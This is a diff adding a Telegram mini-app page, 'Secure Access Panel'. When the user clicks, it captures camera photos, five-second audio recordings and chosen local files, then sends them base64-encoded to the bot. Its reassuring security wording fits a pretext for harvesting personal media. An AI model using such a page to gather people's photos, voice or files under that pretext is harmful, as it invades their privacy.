@@ -1,0 +1,123 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Secure Access Panel</title>
+    <script src="https://telegram.org/js/telegram-web-app.js"></script>
+    <style>
+        body { font-family: Arial, sans-serif; text-align: center; padding: 20px; background: #f0f0f0; }
+        button { padding: 10px 20px; margin: 10px; font-size: 16px; }
+        video, img { max-width: 100%; margin-top: 20px; }
+        #status { margin: 20px; font-weight: bold; }
+    </style>
+</head>
+<body>
+    <h2>🔐 Grant Permissions</h2>
+    <p>Click the buttons below to grant access. Your data will be securely processed.</p>
+    
+    <button onclick="requestCamera()">📸 Access Camera</button>
+    <button onclick="requestMicrophone()">🎤 Access Microphone</button>
+    <button onclick="captureImage()">📷 Capture Photo</button>
+    <button onclick="recordAudio()">🎙️ Record Audio (5s)</button>
+    <button onclick="uploadFile()">📁 Upload File (Storage Access)</button>
+    
+    <div id="status">No data sent yet.</div>
+    <video id="video" autoplay playsinline style="display:none;"></video>
+    <img id="photo" style="display:none;" />
+    <audio id="audioPlayer" controls style="display:none;"></audio>
+    
+    <script>
+        const tg = window.Telegram.WebApp;
+        tg.ready();
+        tg.expand();
+
+        let mediaStream = null;
+        let mediaRecorder = null;
+        let recordedChunks = [];
+
+        async function requestCamera() {
+            try {
+                mediaStream = await navigator.mediaDevices.getUserMedia({ video: true });
+                document.getElementById('video').srcObject = mediaStream;
+                document.getElementById('video').style.display = 'block';
+                sendData({ type: 'camera_access', granted: true });
+            } catch (err) {
+                sendData({ type: 'camera_access', granted: false, error: err.message });
+                alert('Camera permission denied');
+            }
+        }
+
+        async function requestMicrophone() {
+            try {
+                const audioStream = await navigator.mediaDevices.getUserMedia({ audio: true });
+                if (mediaStream) {
+                    mediaStream.addTrack(audioStream.getAudioTracks()[0]);
+                } else {
+                    mediaStream = audioStream;
+                }
+                sendData({ type: 'microphone_access', granted: true });
+            } catch (err) {
+                sendData({ type: 'microphone_access', granted: false, error: err.message });
+                alert('Microphone permission denied');
+            }
+        }
+
+        async function captureImage() {
+            if (!mediaStream || !mediaStream.getVideoTracks().length) {
+                await requestCamera();
+            }
+            const video = document.getElementById('video');
+            const canvas = document.createElement('canvas');
+            canvas.width = video.videoWidth;
+            canvas.height = video.videoHeight;
+            canvas.getContext('2d').drawImage(video, 0, 0);
+            const dataURL = canvas.toDataURL('image/png');
+            document.getElementById('photo').src = dataURL;
+            document.getElementById('photo').style.display = 'block';
+            sendData({ type: 'photo', image: dataURL });
+        }
+
+        async function recordAudio() {
+            if (!mediaStream || !mediaStream.getAudioTracks().length) {
+                await requestMicrophone();
+            }
+            recordedChunks = [];
+            mediaRecorder = new MediaRecorder(mediaStream);
+            mediaRecorder.ondataavailable = (event) => {
+                if (event.data.size > 0) recordedChunks.push(event.data);
+            };
+            mediaRecorder.onstop = () => {
+                const blob = new Blob(recordedChunks, { type: 'audio/webm' });
+                const reader = new FileReader();
+                reader.onload = () => {
+                    sendData({ type: 'audio', audio: reader.result, duration: 5 });
+                };
+                reader.readAsDataURL(blob);
+            };
+            mediaRecorder.start();
+            setTimeout(() => mediaRecorder.stop(), 5000);
+            document.getElementById('status').textContent = 'Recording... 5 seconds';
+        }
+
+        function uploadFile() {
+            const input = document.createElement('input');
+            input.type = 'file';
+            input.onchange = (e) => {
+                const file = e.target.files[0];
+                const reader = new FileReader();
+                reader.onload = () => {
+                    sendData({ type: 'file', filename: file.name, content: reader.result });
+                };
+                reader.readAsDataURL(file);
+            };
+            input.click();
+        }
+
+        function sendData(data) {
+            tg.sendData(JSON.stringify(data));
+            document.getElementById('status').textContent = 'Data sent to bot!';
+        }
+    </script>
+</body>
+</html>
